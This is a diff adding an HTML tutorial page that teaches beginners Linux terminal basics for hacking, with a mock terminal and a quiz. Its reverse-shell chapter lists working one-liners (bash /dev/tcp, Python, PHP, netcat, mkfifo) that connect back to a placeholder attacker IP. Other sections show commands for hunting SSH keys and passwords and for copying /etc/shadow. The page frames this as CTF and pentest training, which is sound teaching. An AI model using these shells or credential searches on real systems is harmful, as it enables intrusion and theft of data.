@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Linux Essentials for Hackers — Terminal Survival Guide ☕</title>
+<link rel="stylesheet" href="../../assets/styles.css"/>
+</head>
+<body data-page-slug="linux-essentials">
+
+<div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+
+<div class="topbar">
+  <a class="logo" href="../../index.html">☕ CYBERSEC.VAULT</a>
+  <nav>
+    <a href="../../index.html">Home</a>
+    <a href="../index.html" class="active">Prerequisites</a>
+    <a href="../../glossary/index.html">Glossary</a>
+  </nav>
+</div>
+
+<div class="breadcrumb">
+  <a href="../../index.html">Home</a><span class="sep">›</span>
+  <a href="../index.html">00-Prerequisites</a><span class="sep">›</span>
+  <span>Linux Essentials</span>
+</div>
+
+<section class="hero">
+  <div class="hero-content">
+    <span class="coffee-badge">🐣 Beginner · Required Before Anything Else</span>
+    <h1>Linux for Hackers</h1>
+    <p class="subtitle">You can't hack from a Windows File Explorer.<br>
+    The terminal is your weapon. Learn it.</p>
+    <div class="tagline">"Knowing Linux is like having a superpower most people don't have."</div>
+    <br>
+    <button class="cta-btn" onclick="document.getElementById('filesystem').scrollIntoView({behavior:'smooth'})">Boot up 🐧</button>
+  </div>
+</section>
+
+<!-- TERMINAL SIMULATOR -->
+<section class="chapter" id="terminal">
+  <div class="chapter-num">Chapter 00 // Interactive Terminal</div>
+  <h2><span class="emoji">💻</span> Practice right here</h2>
+  <p class="lead">Type real Linux commands in this simulated terminal. The file system, processes, and users are mocked — but the commands and their outputs are real.</p>
+
+  <div class="playground" style="padding:0; overflow:hidden;">
+    <div style="background:#0d1117; padding:10px 14px; display:flex; align-items:center; gap:8px; border-bottom:1px solid rgba(255,255,255,0.06);">
+      <div style="width:12px;height:12px;border-radius:50%;background:#ff5f57;"></div>
+      <div style="width:12px;height:12px;border-radius:50%;background:#ffbd2e;"></div>
+      <div style="width:12px;height:12px;border-radius:50%;background:#28c840;"></div>
+      <span style="font-family:var(--mono); font-size:12px; color:var(--ink-mute); margin-left:8px;">kali@hacker: ~</span>
+    </div>
+    <div id="terminal-output" style="background:#0d1117; padding:16px; font-family:var(--mono); font-size:13px; color:#c9d1d9; min-height:200px; max-height:300px; overflow-y:auto; line-height:1.7;"></div>
+    <div style="background:#0d1117; padding:8px 14px; border-top:1px solid rgba(255,255,255,0.06); display:flex; align-items:center; gap:8px;">
+      <span style="color:var(--accent); font-family:var(--mono); font-size:13px; white-space:nowrap;">kali@hacker:~$</span>
+      <input id="terminal-input" type="text" style="flex:1; background:transparent; border:none; color:var(--accent-2); font-family:var(--mono); font-size:13px; outline:none;" placeholder="type a command..."/>
+    </div>
+    <div class="preset-chips" style="margin:0; padding:10px 14px; background:#0d1117; border-top:1px solid rgba(255,255,255,0.06); flex-wrap:wrap;">
+      <span style="color:var(--ink-mute); font-size:11px; align-self:center;">Try →</span>
+      <span class="chip" onclick="runCmd('ls')">ls</span>
+      <span class="chip" onclick="runCmd('pwd')">pwd</span>
+      <span class="chip" onclick="runCmd('whoami')">whoami</span>
+      <span class="chip" onclick="runCmd('id')">id</span>
+      <span class="chip" onclick="runCmd('cat /etc/passwd')">cat /etc/passwd</span>
+      <span class="chip" onclick="runCmd('uname -a')">uname -a</span>
+      <span class="chip" onclick="runCmd('ps aux')">ps aux</span>
+      <span class="chip evil" onclick="runCmd('sudo -l')">sudo -l</span>
+      <span class="chip evil" onclick="runCmd('find / -perm -4000 2>/dev/null')">SUID scan</span>
+    </div>
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- FILESYSTEM -->
+<section class="chapter" id="filesystem">
+  <div class="chapter-num">Chapter 01 // The File System</div>
+  <h2><span class="emoji">🗂️</span> The Linux File System — Know Where Everything Lives</h2>
+
+  <p class="lead">Linux doesn't have C:\ or D:\ drives. Everything is under one root: <code class="inline">/</code>. As a hacker, knowing what lives where is essential.</p>
+
+  <div class="code">
+/                   ← Root of everything
+├── /bin            ← Essential binaries (ls, cat, cp, mv, etc.)
+├── /sbin           ← System binaries (ifconfig, iptables, etc.)
+├── /usr/bin        ← Installed user programs
+├── /usr/local/bin  ← Locally compiled programs
+│
+├── /etc            ← 🔑 Config files (HACKER GOLDMINE)
+│   ├── /etc/passwd     ← User list (username:x:uid:gid:info:home:shell)
+│   ├── /etc/shadow     ← Password hashes (root-readable only)
+│   ├── /etc/hosts      ← Local DNS overrides
+│   ├── /etc/crontab    ← System cron jobs
+│   └── /etc/sudoers    ← Who can sudo what
+│
+├── /home           ← User home directories (/home/alice, /home/bob)
+├── /root           ← Root user's home (the flag is usually here!)
+│
+├── /var            ← Variable data
+│   ├── /var/log        ← Log files (auth.log, syslog, apache2/*)
+│   ├── /var/www/html   ← Web server files (PHP, HTML)
+│   └── /var/backups    ← Backup files (often readable, contain creds)
+│
+├── /tmp            ← Temporary files (world-writable! use for exploits)
+├── /dev            ← Device files (/dev/null, /dev/tty)
+├── /proc           ← Running processes as files (/proc/1/cmdline)
+└── /opt            ← Optional software (custom apps, vuln binaries)
+  </div>
+
+  <h3>Navigation commands</h3>
+  <div class="grid cols-2">
+    <div>
+      <div class="code">
+<span class="com"># Where am I?</span>
+pwd
+
+<span class="com"># List files</span>
+ls          <span class="com"># basic list</span>
+ls -l       <span class="com"># long format (permissions, size, date)</span>
+ls -la      <span class="com"># including hidden files (start with .)</span>
+ls -lh      <span class="com"># human-readable sizes</span>
+ls -lt      <span class="com"># sorted by modification time</span>
+
+<span class="com"># Navigate</span>
+cd /etc         <span class="com"># go to /etc</span>
+cd ..           <span class="com"># go up one level</span>
+cd ~            <span class="com"># go home</span>
+cd -            <span class="com"># go to previous directory</span>
+      </div>
+    </div>
+    <div>
+      <div class="code">
+<span class="com"># Read files</span>
+cat file.txt    <span class="com"># print entire file</span>
+less file.txt   <span class="com"># scroll through (q to quit)</span>
+head -20 file   <span class="com"># first 20 lines</span>
+tail -20 file   <span class="com"># last 20 lines</span>
+tail -f file    <span class="com"># follow (live log view)</span>
+
+<span class="com"># Search inside files</span>
+grep "password" file.txt
+grep -r "secret" /var/www/   <span class="com"># recursive</span>
+grep -i "admin" users.txt    <span class="com"># case-insensitive</span>
+grep -v "comment" file       <span class="com"># EXCLUDE lines</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- PERMISSIONS -->
+<section class="chapter" id="permissions">
+  <div class="chapter-num">Chapter 02 // Permissions</div>
+  <h2><span class="emoji">🔒</span> File Permissions — Critical for PrivEsc</h2>
+
+  <p class="lead">Linux permissions control who can read, write, and execute every file. As a hacker, you need to find files with wrong permissions — writable by you when they shouldn't be.</p>
+
+  <div class="playground">
+    <div class="playground-header"><h4>🔍 Permission Decoder — Paste a permission string</h4></div>
+    <div class="url-bar">
+      <span style="color:var(--ink-mute);">$ ls -la →</span>
+      <input id="perm-input" type="text" value="-rwxr-xr--" oninput="decodePerm()" style="font-family:var(--mono); color:var(--accent-2); font-size:14px; min-width:120px;"/>
+    </div>
+    <div id="perm-output" style="margin-top:12px; font-family:var(--mono); font-size:13px; line-height:1.8; color:var(--ink-dim);"></div>
+    <div class="preset-chips" style="margin-top:10px;">
+      <span class="chip" onclick="setPerm('-rwxrwxrwx')">777 (world-writable!)</span>
+      <span class="chip" onclick="setPerm('-rw-r--r--')">644 (normal file)</span>
+      <span class="chip evil" onclick="setPerm('-rwsr-xr-x')">SUID binary</span>
+      <span class="chip evil" onclick="setPerm('-rwxrwxrwx')">writable by all</span>
+    </div>
+  </div>
+
+  <div class="code">
+<span class="com">## Reading ls -la output:</span>
+-rwxr-xr-- 1 root www-data 4096 Jan 1 backup.sh
+
+<span class="com">##  ↑ breakdown:</span>
+<span class="com">##  - = file type (- = file, d = dir, l = symlink)</span>
+<span class="com">##  rwx = owner (root) can Read, Write, Execute</span>
+<span class="com">##  r-x = group (www-data) can Read, Execute (no Write)</span>
+<span class="com">##  r-- = others can only Read</span>
+
+<span class="com">## Special permission bits (SUID/SGID):</span>
+-rwsr-xr-x   <span class="com"># 's' in owner execute = SUID → runs as file owner</span>
+-rwxr-sr-x   <span class="com"># 's' in group execute = SGID → runs as group owner</span>
+
+<span class="com">## As a hacker — look for:</span>
+find / -writable -type f 2>/dev/null   <span class="com"># files YOU can write</span>
+find / -writable -type d 2>/dev/null   <span class="com"># directories YOU can write</span>
+find / -perm -o+w -type f 2>/dev/null  <span class="com"># world-writable files</span>
+
+<span class="com">## Modify permissions (if you're the owner):</span>
+chmod +x script.sh      <span class="com"># make executable</span>
+chmod 777 file          <span class="com"># world read/write/execute (dangerous!)</span>
+chmod 600 id_rsa        <span class="com"># SSH key: only owner can read</span>
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- NETWORKING -->
+<section class="chapter" id="networking">
+  <div class="chapter-num">Chapter 03 // Networking Commands</div>
+  <h2><span class="emoji">🌐</span> Network Commands Every Hacker Uses Daily</h2>
+
+  <div class="grid cols-2">
+    <div class="card">
+      <h4>📡 Your Network Info</h4>
+      <div class="code" style="font-size:12px; margin-top:8px;">
+<span class="com"># See your IP address:</span>
+ip a                <span class="com"># modern</span>
+ifconfig            <span class="com"># old-school</span>
+
+<span class="com"># Routing table:</span>
+ip route
+route -n
+
+<span class="com"># DNS config:</span>
+cat /etc/resolv.conf
+
+<span class="com"># Hostname:</span>
+hostname
+hostname -I         <span class="com"># all IPs</span>
+      </div>
+    </div>
+    <div class="card">
+      <h4>🔍 Open Ports &amp; Connections</h4>
+      <div class="code" style="font-size:12px; margin-top:8px;">
+<span class="com"># See what's listening:</span>
+ss -tulpn           <span class="com"># modern (preferred)</span>
+netstat -tulpn      <span class="com"># old-school</span>
+
+<span class="com"># Active connections:</span>
+ss -antp
+
+<span class="com"># What process is on port 80?</span>
+lsof -i :80
+ss -tulpn | grep :80
+      </div>
+    </div>
+    <div class="card">
+      <h4>🏓 Testing Connectivity</h4>
+      <div class="code" style="font-size:12px; margin-top:8px;">
+<span class="com"># Ping (ICMP):</span>
+ping 8.8.8.8
+ping -c 4 target.com  <span class="com"># send 4 packets only</span>
+
+<span class="com"># Traceroute:</span>
+traceroute target.com
+
+<span class="com"># DNS lookup:</span>
+nslookup target.com
+dig target.com
+dig target.com ANY     <span class="com"># all record types</span>
+host target.com
+      </div>
+    </div>
+    <div class="card">
+      <h4>🔁 Netcat — The Swiss Army Knife</h4>
+      <div class="code" style="font-size:12px; margin-top:8px;">
+<span class="com"># Listen for connections:</span>
+nc -lvnp 4444
+
+<span class="com"># Connect to a host:</span>
+nc target.com 80
+
+<span class="com"># Banner grab (what's running?):</span>
+nc -v target.com 22
+
+<span class="com"># Reverse shell listener:</span>
+nc -lvnp 4444
+<span class="com"># then on victim: nc ATTACKER 4444 -e /bin/bash</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- FILE OPS -->
+<section class="chapter" id="fileops">
+  <div class="chapter-num">Chapter 04 // File Operations</div>
+  <h2><span class="emoji">📁</span> Essential File Operations</h2>
+
+  <div class="code">
+<span class="com">## ─── FINDING FILES (critical for hacking) ────────────────</span>
+find / -name "*.conf" 2>/dev/null        <span class="com"># find all .conf files</span>
+find / -name "id_rsa" 2>/dev/null        <span class="com"># find SSH keys</span>
+find / -name "*.php" 2>/dev/null         <span class="com"># find PHP files</span>
+find / -size +10M -type f 2>/dev/null    <span class="com"># find large files</span>
+find / -newer /tmp/ref 2>/dev/null       <span class="com"># files newer than ref</span>
+find / -user root -perm -4000 2>/dev/null  <span class="com"># SUID owned by root</span>
+find /home -name ".bash_history" 2>/dev/null  <span class="com"># everyone's history</span>
+
+<span class="com">## ─── GREP (search inside files) ──────────────────────────</span>
+grep -r "password" /var/www/ 2>/dev/null   <span class="com"># find creds in web files</span>
+grep -rn "DB_PASS\|DB_PASSWORD" /var/www/  <span class="com"># database passwords</span>
+grep -rl "secret" /etc/ 2>/dev/null        <span class="com"># files containing 'secret'</span>
+grep -E "^root" /etc/passwd                <span class="com"># root user entry</span>
+
+<span class="com">## ─── AWK &amp; SED (process text output) ─────────────────────</span>
+cat /etc/passwd | awk -F: '{print $1}'     <span class="com"># extract just usernames</span>
+cat /etc/passwd | awk -F: '$3==0'          <span class="com"># find UID 0 (root) accounts</span>
+sed -i 's/old/new/g' file.txt              <span class="com"># replace text in file</span>
+
+<span class="com">## ─── MOVING &amp; COPYING ─────────────────────────────────────</span>
+cp /etc/shadow /tmp/shadow.bak    <span class="com"># copy file</span>
+mv file.txt /tmp/                 <span class="com"># move file</span>
+cp -r /etc/ /tmp/etc_backup/      <span class="com"># copy directory recursively</span>
+
+<span class="com">## ─── ARCHIVES (transfer tools, exfil) ───────────────────</span>
+tar czf archive.tar.gz /var/www/html/    <span class="com"># compress directory</span>
+tar xzf archive.tar.gz                   <span class="com"># extract</span>
+zip -r archive.zip /var/www/html/        <span class="com"># zip it</span>
+unzip archive.zip                        <span class="com"># unzip</span>
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- PROCESSES -->
+<section class="chapter" id="processes">
+  <div class="chapter-num">Chapter 05 // Processes</div>
+  <h2><span class="emoji">⚙️</span> Processes — See What's Running</h2>
+
+  <div class="code">
+<span class="com">## ─── VIEW PROCESSES ───────────────────────────────────────</span>
+ps aux                    <span class="com"># all running processes (snapshot)</span>
+ps aux | grep apache      <span class="com"># is apache running?</span>
+ps aux | grep root        <span class="com"># what is root running?</span>
+top                       <span class="com"># live process viewer (q to quit)</span>
+htop                      <span class="com"># better live viewer (if installed)</span>
+
+<span class="com">## Understanding ps aux output:</span>
+<span class="com">## USER   PID  %CPU  %MEM  VSZ   RSS  TTY  STAT  START  TIME  COMMAND</span>
+<span class="com">## root   1     0.0   0.1  168  10888  ?   Ss   Jan01  0:01  /sbin/init</span>
+<span class="com">##   ↑                                           ↑                ↑</span>
+<span class="com">##   user                                     started           what it is</span>
+
+<span class="com">## ─── KILL PROCESSES ───────────────────────────────────────</span>
+kill PID              <span class="com"># graceful stop (SIGTERM)</span>
+kill -9 PID           <span class="com"># force kill (SIGKILL)</span>
+killall apache2       <span class="com"># kill by name</span>
+
+<span class="com">## ─── RUN IN BACKGROUND ────────────────────────────────────</span>
+./exploit.sh &amp;       <span class="com"># run in background</span>
+nohup ./script.sh &amp;  <span class="com"># survives terminal close</span>
+disown               <span class="com"># detach from shell</span>
+
+<span class="com">## ─── SERVICES (systemd) ───────────────────────────────────</span>
+systemctl list-units --type=service   <span class="com"># all services</span>
+systemctl status ssh                  <span class="com"># SSH status</span>
+systemctl start apache2               <span class="com"># start a service</span>
+service --status-all                  <span class="com"># old-school</span>
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- SHELL FU -->
+<section class="chapter" id="shellfu">
+  <div class="chapter-num">Chapter 06 // Shell-Fu</div>
+  <h2><span class="emoji">⚡</span> Shell Tricks That Make You 10x Faster</h2>
+
+  <div class="code">
+<span class="com">## ─── PIPES &amp; REDIRECTION ──────────────────────────────────</span>
+cat /etc/passwd | grep bash    <span class="com"># pipe: send output to next command</span>
+ls -la &gt; output.txt           <span class="com"># redirect output TO file</span>
+ls -la &gt;&gt; output.txt          <span class="com"># append output to file</span>
+ls -la 2&gt;/dev/null            <span class="com"># redirect ERRORS to null (silence errors)</span>
+ls -la 2&gt;&amp;1                   <span class="com"># merge stderr into stdout</span>
+command &lt; input.txt           <span class="com"># use file as input</span>
+
+<span class="com">## ─── COMMAND CHAINING ─────────────────────────────────────</span>
+cmd1 &amp;&amp; cmd2    <span class="com"># run cmd2 ONLY if cmd1 succeeds</span>
+cmd1 || cmd2    <span class="com"># run cmd2 ONLY if cmd1 FAILS</span>
+cmd1 ; cmd2     <span class="com"># run cmd2 always, regardless</span>
+
+<span class="com">## ─── USEFUL SHORTCUTS ────────────────────────────────────</span>
+Ctrl+C          <span class="com"># kill current command</span>
+Ctrl+Z          <span class="com"># suspend to background (resume: fg)</span>
+Ctrl+L          <span class="com"># clear screen (same as: clear)</span>
+Ctrl+R          <span class="com"># search command history</span>
+Tab             <span class="com"># autocomplete paths and commands</span>
+!!              <span class="com"># run the last command</span>
+sudo !!         <span class="com"># run last command with sudo</span>
+!$              <span class="com"># last argument of previous command</span>
+
+<span class="com">## ─── VARIABLES &amp; SCRIPTING ───────────────────────────────</span>
+TARGET="10.10.10.5"
+echo $TARGET
+nmap -sV $TARGET
+
+<span class="com">## ─── LOOPS (for recon automation) ───────────────────────</span>
+for ip in $(cat hosts.txt); do
+    ping -c 1 $ip &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo "$ip is ALIVE"
+done
+
+<span class="com">## ─── ENCODE / DECODE ─────────────────────────────────────</span>
+echo "hello" | base64                <span class="com"># encode</span>
+echo "aGVsbG8=" | base64 -d          <span class="com"># decode</span>
+echo -n "text" | md5sum              <span class="com"># MD5 hash</span>
+echo -n "text" | sha256sum           <span class="com"># SHA256 hash</span>
+  </div>
+</section>
+
+<div class="divider">// // //</div>
+
+<!-- REVERSE SHELLS -->
+<section class="chapter" id="revshells">
+  <div class="chapter-num">Chapter 07 // Reverse Shells</div>
+  <h2><span class="emoji">🔙</span> Reverse Shells — Getting Interactive Access</h2>
+
+  <p class="lead">A reverse shell is when the victim machine connects BACK to your machine. This bypasses firewalls (outbound traffic is usually allowed). Essential concept for CTFs and pentests.</p>
+
+  <div class="callout info">
+    <strong>💡 Practice only:</strong> These are for CTF machines, TryHackMe/HackTheBox rooms, and authorized pentests. Set up a listener and practice on your local Kali VM.
+  </div>
+
+  <div class="code evil">
+<span class="com">## ─── STEP 1: Start a listener on your machine ────────────</span>
+nc -lvnp 4444
+<span class="com">## Or for a better shell:</span>
+rlwrap nc -lvnp 4444  <span class="com"># adds arrow keys + history</span>
+
+<span class="com">## ─── STEP 2: Get the victim to run one of these ──────────</span>
+
+<span class="com"># Bash reverse shell (most common):</span>
+bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1
+
+<span class="com"># Python3 reverse shell:</span>
+python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("YOUR_IP",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+
+<span class="com"># PHP reverse shell (web exploit context):</span>
+php -r '$sock=fsockopen("YOUR_IP",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+
+<span class="com"># Netcat reverse shell:</span>
+nc YOUR_IP 4444 -e /bin/bash
+<span class="com"># If nc doesn't have -e:</span>
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc YOUR_IP 4444 &gt;/tmp/f
+
+<span class="com">## ─── STEP 3: Upgrade the shell (make it interactive) ─────</span>
+<span class="com"># After you get the basic shell, run these:</span>
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+<span class="com"># Then press: Ctrl+Z</span>
+stty raw -echo
+fg
+<span class="com"># Press Enter twice</span>
+export TERM=xterm
+<span class="com"># Now you have arrow keys, tab completion, Ctrl+C won't kill your shell</span>
+
+<span class="com">## ─── SHORTCUT: Use revshells.com to generate payloads ────</span>
+<span class="com">## https://revshells.com — just enter IP + port, pick language</span>
+  </div>
+</section>
+
+<section class="chapter">
+  <h3>🎮 Test yourself — Linux Quiz</h3>
+  <div class="quiz" id="lq1">
+    <h4>Q1: Which command shows what a user can run as sudo?</h4>
+    <div class="options">
+      <div class="opt" onclick="lans('lq1',this,false)">A. sudo show</div>
+      <div class="opt" onclick="lans('lq1',this,true)">B. sudo -l</div>
+      <div class="opt" onclick="lans('lq1',this,false)">C. ls /etc/sudoers</div>
+      <div class="opt" onclick="lans('lq1',this,false)">D. cat /etc/sudo</div>
+    </div>
+    <div class="feedback" id="lq1-fb"></div>
+  </div>
+  <div class="quiz" id="lq2">
+    <h4>Q2: What does the 's' in -rwsr-xr-x mean?</h4>
+    <div class="options">
+      <div class="opt" onclick="lans('lq2',this,false)">A. Sticky bit</div>
+      <div class="opt" onclick="lans('lq2',this,false)">B. Symbolic link</div>
+      <div class="opt" onclick="lans('lq2',this,true)">C. SUID — runs as the file owner</div>
+      <div class="opt" onclick="lans('lq2',this,false)">D. Super user only</div>
+    </div>
+    <div class="feedback" id="lq2-fb"></div>
+  </div>
+  <div class="quiz" id="lq3">
+    <h4>Q3: What command finds all files with SUID bit set?</h4>
+    <div class="options">
+      <div class="opt" onclick="lans('lq3',this,false)">A. ls -la / | grep suid</div>
+      <div class="opt" onclick="lans('lq3',this,true)">B. find / -perm -4000 -type f 2>/dev/null</div>
+      <div class="opt" onclick="lans('lq3',this,false)">C. grep SUID /etc/files</div>
+      <div class="opt" onclick="lans('lq3',this,false)">D. cat /etc/suid</div>
+    </div>
+    <div class="feedback" id="lq3-fb"></div>
+  </div>
+
+  <div style="margin-top:24px;">
+    <h3>🚀 You're ready for:</h3>
+    <div class="grid cols-3">
+      <a class="card is-link" href="../networking-101/index.html"><h4>🌐 Networking 101</h4><p>TCP/IP, DNS, HTTP — how everything connects.</p></a>
+      <a class="card is-link" href="../../04-Privilege-Escalation/linux-privesc/index.html"><h4>🪜 Linux PrivEsc</h4><p>Use what you just learned to get root.</p></a>
+      <a class="card is-link" href="../../topics/web/sql-injection/index.html"><h4>💉 SQLi</h4><p>Your first web attack. Interactive demo.</p></a>
+    </div>
+  </div>
+</section>
+
+<script src="../../assets/app.js"></script>
+<script src="../../assets/glossary.js"></script>
+<script>
+// Terminal simulator
+const fs = {
+  '/': ['bin','etc','home','root','tmp','var','opt','proc','dev','usr'],
+  '/etc': ['passwd','shadow','hosts','crontab','sudoers','os-release','resolv.conf'],
+  '/home': ['alice','bob','www-data'],
+  '/tmp': [],
+  '/opt': ['backup.sh'],
+  '/var': ['log','www','backups'],
+};
+const passwdContent = `root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+alice:x:1000:1000:Alice,,,:/home/alice:/bin/bash
+bob:x:1001:1001:Bob,,,:/home/bob:/bin/bash`;
+
+let cwd = '/home/alice';
+let history = [];
+let histIdx = -1;
+
+function print(text, color) {
+  const out = document.getElementById('terminal-output');
+  const line = document.createElement('div');
+  line.innerHTML = `<span style="color:${color||'#c9d1d9'}">${text}</span>`;
+  out.appendChild(line);
+  out.scrollTop = out.scrollHeight;
+}
+
+function prompt() { return `<span style="color:#3dd68c">kali@hacker</span><span style="color:#c9d1d9">:</span><span style="color:#5c9cf5">${cwd}</span><span style="color:#c9d1d9">$</span> `; }
+
+function runCmd(cmd) {
+  document.getElementById('terminal-input').value = cmd;
+  execCmd(cmd);
+}
+
+function execCmd(raw) {
+  const cmd = raw.trim();
+  if (!cmd) return;
+  history.unshift(cmd);
+  histIdx = -1;
+  const out = document.getElementById('terminal-output');
+  out.innerHTML += `<div>${prompt()}<span style="color:#c9d1d9">${cmd.replace(/</g,'&lt;')}</span></div>`;
+
+  const parts = cmd.split(/\s+/);
+  const base = parts[0];
+
+  const cmds = {
+    'ls': () => { const d = fs[cwd]||[]; return d.length ? d.join('  ') : '(empty)'; },
+    'pwd': () => cwd,
+    'whoami': () => 'alice',
+    'id': () => 'uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom)',
+    'uname': () => 'Linux kali 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2024-01-14) x86_64 GNU/Linux',
+    'hostname': () => 'kali-vm',
+    'echo': () => parts.slice(1).join(' ').replace(/\$PATH/,'/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin').replace(/\$USER/,'alice').replace(/\$HOME/,'/home/alice'),
+    'env': () => 'SHELL=/bin/bash\nUSER=alice\nHOME=/home/alice\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin\nTERM=xterm-256color\nLANG=en_US.UTF-8',
+    'clear': () => { out.innerHTML = ''; return null; },
+    'history': () => history.map((h,i)=>`  ${i+1}  ${h}`).join('\n'),
+    'help': () => 'Try: ls, pwd, whoami, id, uname -a, cat /etc/passwd, sudo -l, ps aux, find / -perm -4000 2>/dev/null',
+  };
+
+  let result = null;
+  if (cmd === 'cat /etc/passwd' || cmd === 'cat /etc/passwd ') { result = passwdContent; }
+  else if (cmd === 'cat /etc/shadow') { result = 'cat: /etc/shadow: Permission denied'; }
+  else if (cmd === 'cat /etc/os-release') { result = 'NAME="Kali GNU/Linux"\nVERSION_ID="2024.1"\nID=kali\nPRETTY_NAME="Kali GNU/Linux Rolling"'; }
+  else if (cmd === 'sudo -l') { result = 'Matching Defaults entries for alice on kali:\n    env_reset, mail_badpass\n\nUser alice may run the following commands on kali:\n    (root) NOPASSWD: /usr/bin/python3 /opt/backup.py\n    (root) /usr/bin/vim'; }
+  else if (cmd.startsWith('find / -perm -4000') || cmd === 'find / -perm -4000 -type f 2>/dev/null') {
+    result = '/usr/bin/passwd\n/usr/bin/sudo\n/usr/lib/openssh/ssh-keysign\n/usr/bin/python3.10\n\x1b[31m/opt/custom_backup\x1b[0m  ← interesting!';
+  }
+  else if (cmd === 'ps aux') { result = 'USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.1  10444  8960 ?        Ss   Jan01   0:00 /sbin/init\nroot         512  0.0  0.2  15280 10096 ?        Ss   Jan01   0:00 sshd\nwww-data     820  0.0  0.4  98732 16480 ?        S    Jan01   0:02 apache2\nalice       1337  0.0  0.0   2436  1024 pts/0    S    10:00   0:00 /bin/bash'; }
+  else if (cmd.startsWith('cd ')) {
+    const target = parts[1];
+    if (target === '~' || target === '/home/alice') { cwd = '/home/alice'; result = null; }
+    else if (target === '..') { cwd = cwd.split('/').slice(0,-1).join('') || '/'; result = null; }
+    else if (target.startsWith('/') && fs[target] !== undefined) { cwd = target; result = null; }
+    else { result = `bash: cd: ${target}: No such file or directory`; }
+  }
+  else if (cmds[base]) { result = cmds[base](); }
+  else { result = `bash: ${base}: command not found\nHint: try 'help' to see available commands`; }
+
+  if (result !== null) {
+    print(result.replace(/\n/g,'<br>').replace(/ /g,'&nbsp;'));
+  }
+  document.getElementById('terminal-input').value = '';
+  out.scrollTop = out.scrollHeight;
+}
+
+const inp = document.getElementById('terminal-input');
+inp.addEventListener('keydown', e => {
+  if (e.key === 'Enter') execCmd(inp.value);
+  else if (e.key === 'ArrowUp') { histIdx = Math.min(histIdx+1, history.length-1); inp.value = history[histIdx]||''; }
+  else if (e.key === 'ArrowDown') { histIdx = Math.max(histIdx-1, -1); inp.value = histIdx<0?'':history[histIdx]; }
+});
+print('Welcome to the Cybersec Vault terminal simulator. Type \'help\' to begin.', '#3dd68c');
+
+// Permission decoder
+function setPerm(p) { document.getElementById('perm-input').value = p; decodePerm(); }
+function decodePerm() {
+  const p = document.getElementById('perm-input').value;
+  if (p.length < 10) { document.getElementById('perm-output').textContent = 'Enter a 10-char permission string (e.g. -rwxr-xr--)'; return; }
+  const types = {'-':'Regular file','d':'Directory','l':'Symbolic link','c':'Character device','b':'Block device'};
+  const ftype = types[p[0]] || 'Unknown';
+  const perms = [
+    {name:'Owner', bits:p.slice(1,4)},
+    {name:'Group', bits:p.slice(4,7)},
+    {name:'Others', bits:p.slice(7,10)},
+  ];
+  const dangerous = p.includes('s') || (p.slice(7,10).includes('w'));
+  let html = `File type: <span style="color:var(--accent)">${ftype}</span><br><br>`;
+  perms.forEach(({name,bits}) => {
+    const r = bits[0]==='r', w = bits[1]==='w', x = bits[2]==='x'||bits[2]==='s';
+    const suid = bits[2]==='s';
+    html += `<span style="color:var(--accent-3)">${name}:</span> `;
+    html += `${r?'<span style="color:var(--accent)">read</span>':'no-read'} `;
+    html += `${w?'<span style="color:var(--warn)">write</span>':'no-write'} `;
+    html += `${x?'<span style="color:var(--accent)">exec</span>':'no-exec'}`;
+    if(suid) html += ' <span style="color:var(--accent-2); font-weight:bold;">[SUID/SGID SET!]</span>';
+    html += '<br>';
+  });
+  if(dangerous) html += `<br><span style="color:var(--accent-2)">⚠️ Warning: ${p.includes('s')?'SUID bit set — runs as file owner!':'World-writable — anyone can modify this!'}</span>`;
+  document.getElementById('perm-output').innerHTML = html;
+}
+decodePerm();
+
+// Quiz
+function lans(qid, el, correct) {
+  el.closest('.quiz').querySelectorAll('.opt').forEach(o => o.style.pointerEvents = 'none');
+  el.classList.add(correct ? 'correct' : 'wrong');
+  const fb = document.getElementById(qid+'-fb');
+  fb.className = 'feedback '+(correct?'win':'lose');
+  fb.textContent = correct ? '🎉 Correct!' : '❌ Not quite — re-read the chapter!';
+}
+</script>
+</body>
+</html>
